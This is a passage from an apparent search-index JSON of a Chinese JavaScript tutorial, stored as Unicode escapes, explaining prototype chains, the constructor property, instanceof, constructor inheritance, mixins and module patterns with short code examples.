\u3002\u5982\u679c\u5bf9\u8c61\u81ea\u8eab\u548c\u5b83\u7684\u539f\u578b\uff0c\u90fd\u5b9a\u4e49\u4e86\u4e00\u4e2a\u540c\u540d\u5c5e\u6027\uff0c\u90a3\u4e48\u4f18\u5148\u8bfb\u53d6\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd9\u53eb\u505a\u201c\u8986\u76d6\u201d\uff08overriding\uff09\u3002 \u6ce8\u610f\uff0c\u4e00\u7ea7\u7ea7\u5411\u4e0a\uff0c\u5728\u6574\u4e2a\u539f\u578b\u94fe\u4e0a\u5bfb\u627e\u67d0\u4e2a\u5c5e\u6027\uff0c\u5bf9\u6027\u80fd\u662f\u6709\u5f71\u54cd\u7684\u3002\u6240\u5bfb\u627e\u7684\u5c5e\u6027\u5728\u8d8a\u4e0a\u5c42\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u5bf9\u6027\u80fd\u7684\u5f71\u54cd\u8d8a\u5927\u3002\u5982\u679c\u5bfb\u627e\u67d0\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u5c06\u4f1a\u904d\u5386\u6574\u4e2a\u539f\u578b\u94fe\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u8ba9\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u6570\u7ec4\uff0c\u5c31\u610f\u5473\u7740\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u6570\u7ec4\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 var MyArray = function () {}; MyArray . prototype = new Array (); MyArray . prototype . constructor = MyArray ; var mine = new MyArray (); mine . push ( 1 , 2 , 3 ); mine . length // 3 mine instanceof Array // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c mine \u662f\u6784\u9020\u51fd\u6570 MyArray \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u7531\u4e8e MyArray.prototype \u6307\u5411\u4e00\u4e2a\u6570\u7ec4\u5b9e\u4f8b\uff0c\u4f7f\u5f97 mine \u53ef\u4ee5\u8c03\u7528\u6570\u7ec4\u65b9\u6cd5\uff08\u8fd9\u4e9b\u65b9\u6cd5\u5b9a\u4e49\u5728\u6570\u7ec4\u5b9e\u4f8b\u7684 prototype \u5bf9\u8c61\u4e0a\u9762\uff09\u3002\u6700\u540e\u90a3\u884c instanceof \u8868\u8fbe\u5f0f\uff0c\u7528\u6765\u6bd4\u8f83\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u67d0\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff0c\u7ed3\u679c\u5c31\u662f\u8bc1\u660e mine \u4e3a Array \u7684\u5b9e\u4f8b\uff0c instanceof \u8fd0\u7b97\u7b26\u7684\u8be6\u7ec6\u89e3\u91ca\u8be6\u89c1\u540e\u6587\u3002 \u4e0a\u9762\u4ee3\u7801\u8fd8\u51fa\u73b0\u4e86\u539f\u578b\u5bf9\u8c61\u7684 constructor \u5c5e\u6027\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u542b\u4e49\u4e0b\u4e00\u8282\u5c31\u6765\u89e3\u91ca\u3002","title":"\u539f\u578b\u94fe"},{"location":"oop/prototype/#constructor","text":"prototype \u5bf9\u8c61\u6709\u4e00\u4e2a constructor \u5c5e\u6027\uff0c\u9ed8\u8ba4\u6307\u5411 prototype \u5bf9\u8c61\u6240\u5728\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 function P () {} P . prototype . constructor === P // true \u7531\u4e8e constructor \u5c5e\u6027\u5b9a\u4e49\u5728 prototype \u5bf9\u8c61\u4e0a\u9762\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u88ab\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u3002 1 2 3 4 5 6 function P () {} var p = new P (); p . constructor === P // true p . constructor === P . prototype . constructor // true p . hasOwnProperty ( 'constructor' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u662f\u6784\u9020\u51fd\u6570 P \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u4f46\u662f p \u81ea\u8eab\u6ca1\u6709 constructor \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u5176\u5b9e\u662f\u8bfb\u53d6\u539f\u578b\u94fe\u4e0a\u9762\u7684 P.prototype.constructor \u5c5e\u6027\u3002 constructor \u5c5e\u6027\u7684\u4f5c\u7528\u662f\uff0c\u53ef\u4ee5\u5f97\u77e5\u67d0\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5230\u5e95\u662f\u54ea\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4ea7\u751f\u7684\u3002 1 2 3 4 5 function F () {}; var f = new F (); f . constructor === F // true f . constructor === RegExp // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c constructor \u5c5e\u6027\u786e\u5b9a\u4e86\u5b9e\u4f8b\u5bf9\u8c61 f \u7684\u6784\u9020\u51fd\u6570\u662f F \uff0c\u800c\u4e0d\u662f RegExp \u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u6709\u4e86 constructor \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u4ece\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u65b0\u5efa\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002 1 2 3 4 5 function Constr () {} var x = new Constr (); var y = new x . constructor (); y instanceof Constr // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c x \u662f\u6784\u9020\u51fd\u6570 Constr \u7684\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u4ece x.constructor \u95f4\u63a5\u8c03\u7528\u6784\u9020\u51fd\u6570\u3002\u8fd9\u4f7f\u5f97\u5728\u5b9e\u4f8b\u65b9\u6cd5\u4e2d\uff0c\u8c03\u7528\u81ea\u8eab\u7684\u6784\u9020\u51fd\u6570\u6210\u4e3a\u53ef\u80fd\u3002 1 2 3 Constr . prototype . createCopy = function () { return new this . constructor (); }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c createCopy \u65b9\u6cd5\u8c03\u7528\u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002 constructor \u5c5e\u6027\u8868\u793a\u539f\u578b\u5bf9\u8c61\u4e0e\u6784\u9020\u51fd\u6570\u4e4b\u95f4\u7684\u5173\u8054\u5173\u7cfb\uff0c\u5982\u679c\u4fee\u6539\u4e86\u539f\u578b\u5bf9\u8c61\uff0c\u4e00\u822c\u4f1a\u540c\u65f6\u4fee\u6539 constructor \u5c5e\u6027\uff0c\u9632\u6b62\u5f15\u7528\u7684\u65f6\u5019\u51fa\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function Person ( name ) { this . name = name ; } Person . prototype . constructor === Person // true Person . prototype = { method : function () {} }; Person . prototype . constructor === Person // false Person . prototype . constructor === Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6784\u9020\u51fd\u6570 Person \u7684\u539f\u578b\u5bf9\u8c61\u6539\u6389\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u4fee\u6539 constructor \u5c5e\u6027\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u518d\u6307\u5411 Person \u3002\u7531\u4e8e Person \u7684\u65b0\u539f\u578b\u662f\u4e00\u4e2a\u666e\u901a\u5bf9\u8c61\uff0c\u800c\u666e\u901a\u5bf9\u8c61\u7684 constructor \u5c5e\u6027\u6307\u5411 Object \u6784\u9020\u51fd\u6570\uff0c\u5bfc\u81f4 Person.prototype.constructor \u53d8\u6210\u4e86 Object \u3002 \u6240\u4ee5\uff0c\u4fee\u6539\u539f\u578b\u5bf9\u8c61\u65f6\uff0c\u4e00\u822c\u8981\u540c\u65f6\u4fee\u6539 constructor \u5c5e\u6027\u7684\u6307\u5411\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // \u574f\u7684\u5199\u6cd5 C . prototype = { method1 : function (...) { ... }, // ... }; // \u597d\u7684\u5199\u6cd5 C . prototype = { constructor : C , method1 : function (...) { ... }, // ... }; // \u66f4\u597d\u7684\u5199\u6cd5 C . prototype . method1 = function (...) { ... }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8981\u4e48\u5c06 constructor \u5c5e\u6027\u91cd\u65b0\u6307\u5411\u539f\u6765\u7684\u6784\u9020\u51fd\u6570\uff0c\u8981\u4e48\u53ea\u5728\u539f\u578b\u5bf9\u8c61\u4e0a\u6dfb\u52a0\u65b9\u6cd5\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1 instanceof \u8fd0\u7b97\u7b26\u4e0d\u4f1a\u5931\u771f\u3002 \u5982\u679c\u4e0d\u80fd\u786e\u5b9a constructor \u5c5e\u6027\u662f\u4ec0\u4e48\u51fd\u6570\uff0c\u8fd8\u6709\u4e00\u4e2a\u529e\u6cd5\uff1a\u901a\u8fc7 name \u5c5e\u6027\uff0c\u4ece\u5b9e\u4f8b\u5f97\u5230\u6784\u9020\u51fd\u6570\u7684\u540d\u79f0\u3002 1 2 3 function Foo () {} var f = new Foo (); f . constructor . name // \"Foo\"","title":"constructor \u5c5e\u6027"},{"location":"oop/prototype/#instanceof","text":"instanceof \u8fd0\u7b97\u7b26\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5bf9\u8c61\u662f\u5426\u4e3a\u67d0\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 1 2 var v = new Vehicle (); v instanceof Vehicle // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 v \u662f\u6784\u9020\u51fd\u6570 Vehicle \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u5de6\u8fb9\u662f\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53f3\u8fb9\u662f\u6784\u9020\u51fd\u6570\u3002\u5b83\u4f1a\u68c0\u67e5\u53f3\u8fb9\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u5bf9\u8c61\uff08prototype\uff09\uff0c\u662f\u5426\u5728\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\u3002 1 2 3 v instanceof Vehicle // \u7b49\u540c\u4e8e Vehicle . prototype . isPrototypeOf ( v ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Vehicle \u662f\u5bf9\u8c61 v \u7684\u6784\u9020\u51fd\u6570\uff0c\u5b83\u7684\u539f\u578b\u5bf9\u8c61\u662f Vehicle.prototype \uff0c isPrototypeOf() \u65b9\u6cd5\u662f JavaScript \u63d0\u4f9b\u7684\u539f\u751f\u65b9\u6cd5\uff0c\u7528\u4e8e\u68c0\u67e5\u67d0\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u8be6\u7ec6\u89e3\u91ca\u89c1\u540e\u6587\u3002 \u7531\u4e8e instanceof \u68c0\u67e5\u6574\u4e2a\u539f\u578b\u94fe\uff0c\u56e0\u6b64\u540c\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53ef\u80fd\u4f1a\u5bf9\u591a\u4e2a\u6784\u9020\u51fd\u6570\u90fd\u8fd4\u56de true \u3002 1 2 3 var d = new Date (); d instanceof Date // true d instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d \u540c\u65f6\u662f Date \u548c Object \u7684\u5b9e\u4f8b\uff0c\u56e0\u6b64\u5bf9\u8fd9\u4e24\u4e2a\u6784\u9020\u51fd\u6570\u90fd\u8fd4\u56de true \u3002 \u7531\u4e8e\u4efb\u610f\u5bf9\u8c61\uff08\u9664\u4e86 null \uff09\u90fd\u662f Object \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5 instanceof \u8fd0\u7b97\u7b26\u53ef\u4ee5\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u4e3a\u975e null \u7684\u5bf9\u8c61\u3002 1 2 3 4 var obj = { foo : 123 }; obj instanceof Object // true null instanceof Object // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9664\u4e86 null \uff0c\u5176\u4ed6\u5bf9\u8c61\u7684 instanceOf Object \u7684\u8fd0\u7b97\u7ed3\u679c\u90fd\u662f true \u3002 instanceof \u7684\u539f\u7406\u662f\u68c0\u67e5\u53f3\u8fb9\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\uff0c\u662f\u5426\u5728\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\u3002\u6709\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u5c31\u662f\u5de6\u8fb9\u5bf9\u8c61\u7684\u539f\u578b\u94fe\u4e0a\uff0c\u53ea\u6709 null \u5bf9\u8c61\u3002\u8fd9\u65f6\uff0c instanceof \u5224\u65ad\u4f1a\u5931\u771f\u3002 1 2 3 var obj = Object . create ( null ); typeof obj // \"object\" obj instanceof Object // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.create(null) \u8fd4\u56de\u4e00\u4e2a\u65b0\u5bf9\u8c61 obj \uff0c\u5b83\u7684\u539f\u578b\u662f null \uff08 Object.create() \u7684\u8be6\u7ec6\u4ecb\u7ecd\u89c1\u540e\u6587\uff09\u3002\u53f3\u8fb9\u7684\u6784\u9020\u51fd\u6570 Object \u7684 prototype \u5c5e\u6027\uff0c\u4e0d\u5728\u5de6\u8fb9\u7684\u539f\u578b\u94fe\u4e0a\uff0c\u56e0\u6b64 instanceof \u5c31\u8ba4\u4e3a obj \u4e0d\u662f Object \u7684\u5b9e\u4f8b\u3002\u8fd9\u662f\u552f\u4e00\u7684 instanceof \u8fd0\u7b97\u7b26\u5224\u65ad\u4f1a\u5931\u771f\u7684\u60c5\u51b5\uff08\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u662f null \uff09\u3002 instanceof \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u5224\u65ad\u503c\u7684\u7c7b\u578b\u3002 1 2 3 4 var x = [ 1 , 2 , 3 ]; var y = {}; x instanceof Array // true y instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c instanceof \u8fd0\u7b97\u7b26\u5224\u65ad\uff0c\u53d8\u91cf x \u662f\u6570\u7ec4\uff0c\u53d8\u91cf y \u662f\u5bf9\u8c61\u3002 \u6ce8\u610f\uff0c instanceof \u8fd0\u7b97\u7b26\u53ea\u80fd\u7528\u4e8e\u5bf9\u8c61\uff0c\u4e0d\u9002\u7528\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002 1 2 var s = 'hello' ; s instanceof String // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u4e0d\u662f String \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u56e0\u4e3a\u5b57\u7b26\u4e32\u4e0d\u662f\u5bf9\u8c61\uff09\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e undefined \u548c null \uff0c instanceof \u8fd0\u7b97\u7b26\u603b\u662f\u8fd4\u56de false \u3002 1 2 undefined instanceof Object // false null instanceof Object // false \u5229\u7528 instanceof \u8fd0\u7b97\u7b26\uff0c\u8fd8\u53ef\u4ee5\u5de7\u5999\u5730\u89e3\u51b3\uff0c\u8c03\u7528\u6784\u9020\u51fd\u6570\u65f6\uff0c\u5fd8\u4e86\u52a0 new \u547d\u4ee4\u7684\u95ee\u9898\u3002 1 2 3 4 5 6 7 8 function Fubar ( foo , bar ) { if ( this instanceof Fubar ) { this . _foo = foo ; this . _bar = bar ; } else { return new Fubar ( foo , bar ); } } \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 instanceof \u8fd0\u7b97\u7b26\uff0c\u5728\u51fd\u6570\u4f53\u5185\u90e8\u5224\u65ad this \u5173\u952e\u5b57\u662f\u5426\u4e3a\u6784\u9020\u51fd\u6570 Fubar \u7684\u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u662f\uff0c\u5c31\u8868\u660e\u5fd8\u4e86\u52a0 new \u547d\u4ee4\u3002","title":"instanceof \u8fd0\u7b97\u7b26"},{"location":"oop/prototype/#_5","text":"\u8ba9\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u7ee7\u627f\u53e6\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u662f\u975e\u5e38\u5e38\u89c1\u7684\u9700\u6c42\u3002\u8fd9\u53ef\u4ee5\u5206\u6210\u4e24\u6b65\u5b9e\u73b0\u3002\u7b2c\u4e00\u6b65\u662f\u5728\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u4e2d\uff0c\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 function Sub ( value ) { Super . call ( this ); this . prop = value ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Sub \u662f\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c this \u662f\u5b50\u7c7b\u7684\u5b9e\u4f8b\u3002\u5728\u5b9e\u4f8b\u4e0a\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570 Super \uff0c\u5c31\u4f1a\u8ba9\u5b50\u7c7b\u5b9e\u4f8b\u5177\u6709\u7236\u7c7b\u5b9e\u4f8b\u7684\u5c5e\u6027\u3002 \u7b2c\u4e8c\u6b65\uff0c\u662f\u8ba9\u5b50\u7c7b\u7684\u539f\u578b\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\uff0c\u8fd9\u6837\u5b50\u7c7b\u5c31\u53ef\u4ee5\u7ee7\u627f\u7236\u7c7b\u539f\u578b\u3002 1 2 3 Sub . prototype = Object . create ( Super . prototype ); Sub . prototype . constructor = Sub ; Sub . prototype . method = '...' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Sub.prototype \u662f\u5b50\u7c7b\u7684\u539f\u578b\uff0c\u8981\u5c06\u5b83\u8d4b\u503c\u4e3a Object.create(Super.prototype) \uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u7b49\u4e8e Super.prototype \u3002\u5426\u5219\u540e\u9762\u4e24\u884c\u5bf9 Sub.prototype \u7684\u64cd\u4f5c\uff0c\u4f1a\u8fde\u7236\u7c7b\u7684\u539f\u578b Super.prototype \u4e00\u8d77\u4fee\u6539\u6389\u3002 \u53e6\u5916\u4e00\u79cd\u5199\u6cd5\u662f Sub.prototype \u7b49\u4e8e\u4e00\u4e2a\u7236\u7c7b\u5b9e\u4f8b\u3002 1 Sub . prototype = new Super (); \u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u4e5f\u6709\u7ee7\u627f\u7684\u6548\u679c\uff0c\u4f46\u662f\u5b50\u7c7b\u4f1a\u5177\u6709\u7236\u7c7b\u5b9e\u4f8b\u7684\u65b9\u6cd5\u3002\u6709\u65f6\uff0c\u8fd9\u53ef\u80fd\u4e0d\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u6240\u4ee5\u4e0d\u63a8\u8350\u4f7f\u7528\u8fd9\u79cd\u5199\u6cd5\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a Shape \u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function Shape () { this . x = 0 ; this . y = 0 ; } Shape . prototype . move = function ( x , y ) { this . x += x ; this . y += y ; console . info ( 'Shape moved.' ); }; \u6211\u4eec\u9700\u8981\u8ba9 Rectangle \u6784\u9020\u51fd\u6570\u7ee7\u627f Shape \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u7b2c\u4e00\u6b65\uff0c\u5b50\u7c7b\u7ee7\u627f\u7236\u7c7b\u7684\u5b9e\u4f8b function Rectangle () { Shape . call ( this ); // \u8c03\u7528\u7236\u7c7b\u6784\u9020\u51fd\u6570 } // \u53e6\u4e00\u79cd\u5199\u6cd5 function Rectangle () { this . base = Shape ; this . base (); } // \u7b2c\u4e8c\u6b65\uff0c\u5b50\u7c7b\u7ee7\u627f\u7236\u7c7b\u7684\u539f\u578b Rectangle . prototype = Object . create ( Shape . prototype ); Rectangle . prototype . constructor = Rectangle ; \u91c7\u7528\u8fd9\u6837\u7684\u5199\u6cd5\u4ee5\u540e\uff0c instanceof \u8fd0\u7b97\u7b26\u4f1a\u5bf9\u5b50\u7c7b\u548c\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u90fd\u8fd4\u56de true \u3002 1 2 3 4 var rect = new Rectangle (); rect instanceof Rectangle // true rect instanceof Shape // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b\u662f\u6574\u4f53\u7ee7\u627f\u7236\u7c7b\u3002\u6709\u65f6\u53ea\u9700\u8981\u5355\u4e2a\u65b9\u6cd5\u7684\u7ee7\u627f\uff0c\u8fd9\u65f6\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 ClassB . prototype . print = function () { ClassA . prototype . print . call ( this ); // some code } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b B \u7684 print \u65b9\u6cd5\u5148\u8c03\u7528\u7236\u7c7b A \u7684 print \u65b9\u6cd5\uff0c\u518d\u90e8\u7f72\u81ea\u5df1\u7684\u4ee3\u7801\u3002\u8fd9\u5c31\u7b49\u4e8e\u7ee7\u627f\u4e86\u7236\u7c7b A \u7684 print \u65b9\u6cd5\u3002","title":"\u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f"},{"location":"oop/prototype/#_6","text":"JavaScript \u4e0d\u63d0\u4f9b\u591a\u91cd\u7ee7\u627f\u529f\u80fd\uff0c\u5373\u4e0d\u5141\u8bb8\u4e00\u4e2a\u5bf9\u8c61\u540c\u65f6\u7ee7\u627f\u591a\u4e2a\u5bf9\u8c61\u3002\u4f46\u662f\uff0c\u53ef\u4ee5\u901a\u8fc7\u53d8\u901a\u65b9\u6cd5\uff0c\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function M1 () { this . hello = 'hello' ; } function M2 () { this . world = 'world' ; } function S () { M1 . call ( this ); M2 . call ( this ); } // \u7ee7\u627f M1 S . prototype = Object . create ( M1 . prototype ); // \u7ee7\u627f\u94fe\u4e0a\u52a0\u5165 M2 Object . assign ( S . prototype , M2 . prototype ); // \u6307\u5b9a\u6784\u9020\u51fd\u6570 S . prototype . constructor = S ; var s = new S (); s . hello // 'hello' s . world // 'world' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7c7b S \u540c\u65f6\u7ee7\u627f\u4e86\u7236\u7c7b M1 \u548c M2 \u3002\u8fd9\u79cd\u6a21\u5f0f\u53c8\u79f0\u4e3a Mixin\uff08\u6df7\u5165\uff09\u3002","title":"\u591a\u91cd\u7ee7\u627f"},{"location":"oop/prototype/#_7","text":"\u968f\u7740\u7f51\u7ad9\u9010\u6e10\u53d8\u6210\u201c\u4e92\u8054\u7f51\u5e94\u7528\u7a0b\u5e8f\u201d\uff0c\u5d4c\u5165\u7f51\u9875\u7684 JavaScript \u4ee3\u7801\u8d8a\u6765\u8d8a\u5e9e\u5927\uff0c\u8d8a\u6765\u8d8a\u590d\u6742\u3002\u7f51\u9875\u8d8a\u6765\u8d8a\u50cf\u684c\u9762\u7a0b\u5e8f\uff0c\u9700\u8981\u4e00\u4e2a\u56e2\u961f\u5206\u5de5\u534f\u4f5c\u3001\u8fdb\u5ea6\u7ba1\u7406\u3001\u5355\u5143\u6d4b\u8bd5\u7b49\u7b49\u2026\u2026\u5f00\u53d1\u8005\u5fc5\u987b\u4f7f\u7528\u8f6f\u4ef6\u5de5\u7a0b\u7684\u65b9\u6cd5\uff0c\u7ba1\u7406\u7f51\u9875\u7684\u4e1a\u52a1\u903b\u8f91\u3002 JavaScript \u6a21\u5757\u5316\u7f16\u7a0b\uff0c\u5df2\u7ecf\u6210\u4e3a\u4e00\u4e2a\u8feb\u5207\u7684\u9700\u6c42\u3002\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u8981\u5b9e\u73b0\u6838\u5fc3\u7684\u4e1a\u52a1\u903b\u8f91\uff0c\u5176\u4ed6\u90fd\u53ef\u4ee5\u52a0\u8f7d\u522b\u4eba\u5df2\u7ecf\u5199\u597d\u7684\u6a21\u5757\u3002 \u4f46\u662f\uff0cJavaScript \u4e0d\u662f\u4e00\u79cd\u6a21\u5757\u5316\u7f16\u7a0b\u8bed\u8a00\uff0cES6 \u624d\u5f00\u59cb\u652f\u6301\u201c\u7c7b\u201d\u548c\u201c\u6a21\u5757\u201d\u3002\u4e0b\u9762\u4ecb\u7ecd\u4f20\u7edf\u7684\u505a\u6cd5\uff0c\u5982\u4f55\u5229\u7528\u5bf9\u8c61\u5b9e\u73b0\u6a21\u5757\u7684\u6548\u679c\u3002","title":"\u6a21\u5757"},{"location":"oop/prototype/#_8","text":"\u6a21\u5757\u662f\u5b9e\u73b0\u7279\u5b9a\u529f\u80fd\u7684\u4e00\u7ec4\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u5c01\u88c5\u3002 \u7b80\u5355\u7684\u505a\u6cd5\u662f\u628a\u6a21\u5757\u5199\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u6709\u7684\u6a21\u5757\u6210\u5458\u90fd\u653e\u5230\u8fd9\u4e2a\u5bf9\u8c61\u91cc\u9762\u3002 1 2 3 4 5 6 7 8 9 var module1 = new Object ({ \u3000 _count : 0 , \u3000 m1 : function (){ \u3000\u3000 //... \u3000 }, \u3000 m2 : function (){ \u3000 //... \u3000 } }); \u4e0a\u9762\u7684\u51fd\u6570 m1 \u548c m2 \uff0c\u90fd\u5c01\u88c5\u5728 module1 \u5bf9\u8c61\u91cc\u3002\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u5c31\u662f\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 module1 . m1 (); \u4f46\u662f\uff0c\u8fd9\u6837\u7684\u5199\u6cd5\u4f1a\u66b4\u9732\u6240\u6709\u6a21\u5757\u6210\u5458\uff0c\u5185\u90e8\u72b6\u6001\u53ef\u4ee5\u88ab\u5916\u90e8\u6539\u5199\u3002\u6bd4\u5982\uff0c\u5916\u90e8\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u6539\u53d8\u5185\u90e8\u8ba1\u6570\u5668\u7684\u503c\u3002 1 module1 . _count = 5 ;","title":"\u57fa\u672c\u7684\u5b9e\u73b0\u65b9\u6cd5"},{"location":"oop/prototype/#_9","text":"\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6784\u9020\u51fd\u6570\uff0c\u5c01\u88c5\u79c1\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function StringBuilder () { var buffer = []; this . add = function ( str ) { buffer . push ( str ); }; this . toString = function () { return buffer . join ( '' ); }; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c buffer \u662f\u6a21\u5757\u7684\u79c1\u6709\u53d8\u91cf\u3002\u4e00\u65e6\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5916\u90e8\u662f\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee buffer \u7684\u3002\u4f46\u662f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u5c06\u79c1\u6709\u53d8\u91cf\u5c01\u88c5\u5728\u6784\u9020\u51fd\u6570\u4e2d\uff0c\u5bfc\u81f4\u6784\u9020\u51fd\u6570\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u662f\u4e00\u4f53\u7684\uff0c\u603b\u662f\u5b58\u5728\u4e8e\u5185\u5b58\u4e4b\u4e2d\uff0c\u65e0\u6cd5\u5728\u4f7f\u7528\u5b8c\u6210\u540e\u6e05\u9664\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6784\u9020\u51fd\u6570\u6709\u53cc\u91cd\u4f5c\u7528\uff0c\u65e2\u7528\u6765\u5851\u9020\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53c8\u7528\u6765\u4fdd\u5b58\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6570\u636e\uff0c\u8fdd\u80cc\u4e86\u6784\u9020\u51fd\u6570\u4e0e\u5b9e\u4f8b\u5bf9\u8c61\u5728\u6570\u636e\u4e0a\u76f8\u5206\u79bb\u7684\u539f\u5219\uff08\u5373\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6570\u636e\uff0c\u4e0d\u5e94\u8be5\u4fdd\u5b58\u5728\u5b9e\u4f8b\u5bf9\u8c61\u4ee5\u5916\uff09\u3002\u540c\u65f6\uff0c\u975e\u5e38\u8017\u8d39\u5185\u5b58\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function StringBuilder () { this . _buffer = []; } StringBuilder . prototype = { constructor : StringBuilder , add : function ( str ) { 